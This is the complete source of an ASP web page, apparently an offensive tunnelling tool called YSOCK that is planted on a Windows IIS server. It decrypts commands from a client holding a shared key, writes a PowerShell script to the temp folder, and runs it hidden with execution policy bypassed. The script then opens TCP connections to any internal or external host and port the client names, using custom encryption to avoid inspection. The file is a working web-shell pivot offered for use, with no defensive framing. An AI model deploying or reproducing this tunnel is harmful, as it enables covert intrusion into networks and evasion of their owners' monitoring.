<%@ Language="JScript" %>
<%
// YSOCK Classic ASP Tunnel - Classic Mode
// TCP via PowerShell backend + file IPC
var KEY = "CHANGE_ME";
var ECTR = 0;
var K256=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
var B64C="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var fso = Server.CreateObject("Scripting.FileSystemObject");
var shell = Server.CreateObject("WScript.Shell");
var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");

function sha256(msg){var h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;var p=msg.slice();p.push(0x80);while(p.length%64!=56)p.push(0);var bl=msg.length*8;p.push(0,0,0,0,(bl>>24)&0xFF,(bl>>16)&0xFF,(bl>>8)&0xFF,bl&0xFF);for(var o=0;o<p.length;o+=64){var w=[];for(var t=0;t<16;t++){var i=o+t*4;w[t]=(p[i]<<24)|(p[i+1]<<16)|(p[i+2]<<8)|p[i+3];}for(var t=16;t<64;t++){var a=w[t-15],b=w[t-2];var s0=((a>>>7)|(a<<25))^((a>>>18)|(a<<14))^(a>>>3);var s1=((b>>>17)|(b<<15))^((b>>>19)|(b<<13))^(b>>>10);w[t]=(w[t-16]+s0+w[t-7]+s1)|0;}var a_=h0,b_=h1,c_=h2,d_=h3,e_=h4,f_=h5,g_=h6,h_=h7;for(var t=0;t<64;t++){var S1=((e_>>>6)|(e_<<26))^((e_>>>11)|(e_<<21))^((e_>>>25)|(e_<<7));var ch=(e_&f_)^(~e_&g_);var t1=(h_+S1+ch+K256[t]+w[t])|0;var S0=((a_>>>2)|(a_<<30))^((a_>>>13)|(a_<<19))^((a_>>>22)|(a_<<10));var maj=(a_&b_)^(a_&c_)^(b_&c_);var t2=(S0+maj)|0;h_=g_;g_=f_;f_=e_;e_=(d_+t1)|0;d_=c_;c_=b_;b_=a_;a_=(t1+t2)|0;}h0=(h0+a_)|0;h1=(h1+b_)|0;h2=(h2+c_)|0;h3=(h3+d_)|0;h4=(h4+e_)|0;h5=(h5+f_)|0;h6=(h6+g_)|0;h7=(h7+h_)|0;}var r=[];var H=[h0,h1,h2,h3,h4,h5,h6,h7];for(var i=0;i<8;i++){r.push((H[i]>>24)&0xFF,(H[i]>>16)&0xFF,(H[i]>>8)&0xFF,H[i]&0xFF);}return r;}

function hmac256(key,data){var k=key.slice();if(k.length>64)k=sha256(k);while(k.length<64)k.push(0);var ip=[],op=[];for(var i=0;i<64;i++){ip.push(k[i]^0x36);op.push(k[i]^0x5C);}return sha256(op.concat(sha256(ip.concat(data))));}

function cat(a,b){return a.concat(b);}
function s2b(s){var r=[];for(var i=0;i<s.length;i++)r.push(s.charCodeAt(i)&0xFF);return r;}

function dk(key){var m=sha256(s2b(key));return[sha256(cat(m,s2b("enc"))),sha256(cat(m,s2b("auth")))];}

function gks(ek,n,len){var ms=[],c=0;while(ms.length<len){var inp=cat(ek,n);inp.push((c>>24)&0xFF,(c>>16)&0xFF,(c>>8)&0xFF,c&0xFF);var h=sha256(inp);var r=len-ms.length;if(r>h.length)r=h.length;for(var i=0;i<r;i++)ms.push(h[i]);c++;}return ms;}

function ctag(ak,n,ct){var h=hmac256(ak,n.concat(ct));return h.slice(0,16);}

function enc(data,key){try{var ks=dk(key);var ek=ks[0],ak=ks[1];ECTR++;var inp=ek.slice();inp.push((ECTR>>56)&0xFF,(ECTR>>48)&0xFF,(ECTR>>40)&0xFF,(ECTR>>32)&0xFF,(ECTR>>24)&0xFF,(ECTR>>16)&0xFF,(ECTR>>8)&0xFF,ECTR&0xFF);var iv=sha256(inp);var n=iv.slice(0,12);var ks2=gks(ek,n,data.length);var ct=[];for(var i=0;i<data.length;i++)ct.push((data[i]^ks2[i])&0xFF);var tag=ctag(ak,n,ct);return n.concat(ct).concat(tag);}catch(e){return[];}}

function dec(data,key){try{if(data.length<28)return null;var ks=dk(key);var ek=ks[0],ak=ks[1];var n=data.slice(0,12);var tag=data.slice(data.length-16);var ct=data.slice(12,data.length-16);var exp=ctag(ak,n,ct);for(var i=0;i<16;i++)if(exp[i]!==tag[i])return null;var ks2=gks(ek,n,ct.length);var pt=[];for(var i=0;i<ct.length;i++)pt.push((ct[i]^ks2[i])&0xFF);return pt;}catch(e){return null;}}

function mkPkt(flag,sid,seq,ack,data){var r=[flag];r.push((sid>>24)&0xFF,(sid>>16)&0xFF,(sid>>8)&0xFF,sid&0xFF);r.push((seq>>24)&0xFF,(seq>>16)&0xFF,(seq>>8)&0xFF,seq&0xFF);r.push((ack>>24)&0xFF,(ack>>16)&0xFF,(ack>>8)&0xFF,ack&0xFF);r.push((data.length>>24)&0xFF,(data.length>>16)&0xFF,(data.length>>8)&0xFF,data.length&0xFF);return r.concat(data);}

function parseSyn(raw){try{if(raw.length<2)return null;var cnt=(raw[0]<<8)|raw[1],off=2;for(var i=0;i<cnt;i++){if(off+17>raw.length)break;var flag=raw[off];var sid=(raw[off+1]<<24)|(raw[off+2]<<16)|(raw[off+3]<<8)|raw[off+4];var seq=(raw[off+5]<<24)|(raw[off+6]<<16)|(raw[off+7]<<8)|raw[off+8];var dlen=(raw[off+13]<<24)|(raw[off+14]<<16)|(raw[off+15]<<8)|raw[off+16];off+=17;if((flag&0x0F)===0x01)return[sid,seq];off+=dlen;}}catch(e){}return null;}

function parseSynData(raw){try{if(raw.length<2)return null;var cnt=(raw[0]<<8)|raw[1],off=2;for(var i=0;i<cnt;i++){if(off+17>raw.length)break;var flag=raw[off];var dlen=(raw[off+13]<<24)|(raw[off+14]<<16)|(raw[off+15]<<8)|raw[off+16];off+=17;if(off+dlen>raw.length)break;if((flag&0x0F)===0x01){var d=[];for(var j=0;j<dlen;j++)d.push(raw[off+j]);return d;}off+=dlen;}}catch(e){}return null;}

function b64e(arr){var s="";for(var i=0;i<arr.length;i+=3){var b1=arr[i],b2=(i+1<arr.length)?arr[i+1]:0,b3=(i+2<arr.length)?arr[i+2]:0;s+=B64C.charAt(b1>>2);s+=B64C.charAt(((b1&3)<<4)|(b2>>4));s+=(i+1<arr.length)?B64C.charAt(((b2&15)<<2)|(b3>>6)):"=";s+=(i+2<arr.length)?B64C.charAt(b3&63):"=";}return s;}

function b64d(s){var arr=[];s=s.replace(/=+$/,"");for(var i=0;i<s.length;i+=4){var b1=B64C.indexOf(s.charAt(i)),b2=B64C.indexOf(s.charAt(i+1));var b3=(i+2<s.length)?B64C.indexOf(s.charAt(i+2)):0;var b4=(i+3<s.length)?B64C.indexOf(s.charAt(i+3)):0;arr.push((b1<<2)|(b2>>4));if(i+2<s.length)arr.push(((b2&15)<<4)|(b3>>2));if(i+3<s.length)arr.push(((b3&3)<<6)|b4);}return arr;}

function jStr(json,key){var q='"'+key+'"';var i=json.indexOf(q);if(i<0)return null;i+=q.length;while(i<json.length&&json.charAt(i)!==':')i++;if(i>=json.length)return null;i++;while(i<json.length&&json.charAt(i)===' ')i++;if(i>=json.length)return null;if(json.charAt(i)==='"'){var sb="";i++;while(i<json.length&&json.charAt(i)!=='"'){if(json.charAt(i)==='\\'&&i+1<json.length){i++;sb+=json.charAt(i);}else{sb+=json.charAt(i);}i++;}return sb;}var s=i;while(i<json.length&&",} \t\r\n".indexOf(json.charAt(i))<0)i++;return json.substring(s,i);}

// File IPC helpers
function getSessionDir(sid){return tempDir+"\\ysock_"+sid;}
function getWFile(sid){return getSessionDir(sid)+"\\w.txt";}
function getRFile(sid){return getSessionDir(sid)+"\\r.txt";}
function getCFile(sid){return getSessionDir(sid)+"\\c";}
function getPsFile(sid){return getSessionDir(sid)+"\\bg.ps1";}

function appendLine(path,line){var f=fso.OpenTextFile(path,8,true);f.WriteLine(line);f.Close();}

function readAndClear(path){
    if(!fso.FileExists(path))return[];
    var f=fso.OpenTextFile(path,1);
    var content=f.ReadAll();
    f.Close();
    if(content.length===0)return[];
    var allData=[];
    var lines=content.split("\n");
    for(var i=0;i<lines.length;i++){
        var line=lines[i].replace(/\r/g,"");
        if(line.length===0)continue;
        try{allData=allData.concat(b64d(line));}catch(e){}
    }
    var f2=fso.CreateTextFile(path,true);
    f2.Close();
    return allData;
}

function startBgPS(sid,host,port){
    var dir=getSessionDir(sid);
    if(!fso.FolderExists(dir))fso.CreateFolder(dir);
    var wFile=getWFile(sid);
    var rFile=getRFile(sid);
    var cFile=getCFile(sid);
    // init empty files
    var f=fso.CreateTextFile(wFile,true);f.Close();
    f=fso.CreateTextFile(rFile,true);f.Close();
    // PowerShell background script
    var ps='$ErrorActionPreference="SilentlyContinue"\r\n';
    ps+='$h="'+host+'"\r\n';
    ps+='$p='+port+'\r\n';
    ps+='$w="'+wFile+'"\r\n';
    ps+='$r="'+rFile+'"\r\n';
    ps+='$c="'+cFile+'"\r\n';
    ps+='$sock=New-Object System.Net.Sockets.TcpClient\r\n';
    ps+='$sock.Connect($h,$p)\r\n';
    ps+='$sock.NoDelay=$true\r\n';
    ps+='$stream=$sock.GetStream()\r\n';
    ps+='$buf=New-Object byte[] 65536\r\n';
    ps+='while($sock.Connected -and !(Test-Path $c)){\r\n';
    ps+='  if($stream.DataAvailable){\r\n';
    ps+='    $n=$stream.Read($buf,0,$buf.Length)\r\n';
    ps+='    if($n -le 0){break}\r\n';
    ps+='    $d=New-Object byte[] $n\r\n';
    ps+='    [Array]::Copy($buf,$d,$n)\r\n';
    ps+='    Add-Content $r ([Convert]::ToBase64String($d))\r\n';
    ps+='  }\r\n';
    ps+='  if((Test-Path $w) -and ((Get-Item $w).Length -gt 0)){\r\n';
    ps+='    try{\r\n';
    ps+='      $lines=Get-Content $w\r\n';
    ps+='      [IO.File]::WriteAllText($w,"")\r\n';
    ps+='      foreach($ln in $lines){\r\n';
    ps+='        if($ln.Length -gt 0){\r\n';
    ps+='          $bytes=[Convert]::FromBase64String($ln)\r\n';
    ps+='          $stream.Write($bytes,0,$bytes.Length)\r\n';
    ps+='        }\r\n';
    ps+='      }\r\n';
    ps+='      $stream.Flush()\r\n';
    ps+='    }catch{}\r\n';
    ps+='  }\r\n';
    ps+='  Start-Sleep -Milliseconds 50\r\n';
    ps+='}\r\n';
    ps+='if($sock.Connected){$sock.Close()}\r\n';
    ps+='New-Item $c -ItemType File -Force|Out-Null\r\n';
    // write ps1
    var psFile=getPsFile(sid);
    f=fso.CreateTextFile(psFile,true);
    f.Write(ps);
    f.Close();
    // run hidden
    shell.Run('powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "'+psFile+'"',0,false);
}

// Read request body
var bodyStr="";
if(Request.TotalBytes>0){
    var bs=Request.BinaryRead(Request.TotalBytes);
    var arr=new VBArray(bs).toArray();
    for(var i=0;i<arr.length;i++)bodyStr+=String.fromCharCode(arr[i]);
}
if(bodyStr.length===0){Response.Write("{\"d\":\"\"}");Response.End();}
var action=jStr(bodyStr,"a");
if(action===null){Response.Write("{\"d\":\"\"}");Response.End();}

try{
if(action==="h"){
    var rd=jStr(bodyStr,"d");
    if(rd===null){Response.Write("{\"d\":\"\",\"m\":3}");Response.End();}
    var raw=dec(b64d(rd),KEY);
    if(raw===null){Response.Write("{\"d\":\"\",\"m\":3}");Response.End();}
    Response.Write("{\"d\":\""+b64e(enc(raw,KEY))+"\",\"m\":3}");
    Response.End();
}
if(action==="cc"){
    var rd=jStr(bodyStr,"d");
    if(rd===null){Response.Write("{\"d\":\"\"}");Response.End();}
    var raw=dec(b64d(rd),KEY);
    if(raw===null||raw.length<2){Response.Write("{\"d\":\"\"}");Response.End();}
    var synData=parseSynData(raw);
    var synInfo=parseSyn(raw);
    if(synData===null||synInfo===null){Response.Write("{\"d\":\"\"}");Response.End();}
    var sid=synInfo[0];var seq=synInfo[1];
    // parse target
    var hlen=synData[0];
    var host="";
    for(var i=0;i<hlen;i++)host+=String.fromCharCode(synData[1+i]);
    var port=(synData[1+hlen]<<8)|synData[2+hlen];
    try{
        startBgPS(sid,host,port);
        // wait briefly for connection
        var wait=0;
        while(!fso.FileExists(getCFile(sid))&&wait<20){var x=new Date().getTime();while(new Date().getTime()-x<100);}
        // check if failed (c file exists means PS exited)
        if(fso.FileExists(getCFile(sid))&&(!fso.FileExists(getRFile(sid)))){
            Response.Write("{\"d\":\"\"}");
            Response.End();
        }
        var fb=[0,1];
        fb=fb.concat(mkPkt(0x04,sid,0,seq,[]));
        Response.Write("{\"d\":\""+b64e(enc(fb,KEY))+"\",\"id\":\""+sid+"\"}");
    }catch(e){
        var fb=[0,1];
        fb=fb.concat(mkPkt(0x00,sid,0,seq,[]));
        Response.Write("{\"d\":\""+b64e(enc(fb,KEY))+"\"}");
    }
    Response.End();
}
if(action==="cp"){
    var idStr=jStr(bodyStr,"id");
    var rd=jStr(bodyStr,"d");
    var sid=0;
    if(idStr!==null&&idStr.length>0)sid=parseInt(idStr);
    // write data if present
    if(rd!==null&&rd.length>0&&sid>0){
        var raw=dec(b64d(rd),KEY);
        if(raw!==null){
            appendLine(getWFile(sid),b64e(raw));
        }
    }
    if(sid>0){
        var rData=readAndClear(getRFile(sid));
        var fin=false;
        if(fso.FileExists(getCFile(sid)))fin=true;
        if(rData.length>0){
            var fb=[0,1];
            fb=fb.concat(mkPkt(0x02,sid,0,0,rData));
            Response.Write("{\"d\":\""+b64e(enc(fb,KEY))+"\",\"fin\":"+(fin?"true":"false")+"}");
        }else if(fin){
            var fb=[0,1];
            fb=fb.concat(mkPkt(0x08,sid,0,0,[]));
            Response.Write("{\"d\":\""+b64e(enc(fb,KEY))+"\",\"fin\":true}");
        }else{
            Response.Write("{\"d\":\"\",\"fin\":false}");
        }
        Response.End();
    }
    Response.Write("{\"d\":\"\",\"fin\":false}");
    Response.End();
}
Response.Write("{\"d\":\"\"}");
}catch(e){Response.Write("{\"d\":\"\"}");}
%>